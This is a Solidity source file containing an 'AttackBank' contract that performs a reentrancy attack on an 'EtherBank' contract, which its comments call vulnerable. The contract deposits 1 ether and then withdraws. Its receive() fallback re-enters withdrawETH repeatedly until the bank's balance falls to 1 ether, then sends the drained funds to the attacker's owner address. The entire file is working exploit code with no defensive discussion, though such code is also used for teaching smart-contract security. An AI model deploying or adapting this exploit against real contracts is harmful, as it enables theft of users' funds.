// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

interface EtherBank {
    function depositETH(
    ) payable external;
    function withdrawETH(
    ) external;
}

contract AttackBank {

    EtherBank public immutable etherBank;
    address public owner;

    // Constructor loads vulnerable contract and sets attack contract's owner
    constructor(address _etherBankAddress) {
        owner = msg.sender;
        etherBank = EtherBank(_etherBankAddress);
    }

    // Will initiate the re-entrance attack
    function attack() external payable {
        etherBank.depositETH{value: 1 ether}();
        etherBank.withdrawETH();
    }

    // Fallback Function - Will be executed once ETH is sent to this contract
    receive() external payable{

        if (address(etherBank).balance > 1 ether) {
            etherBank.withdrawETH();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
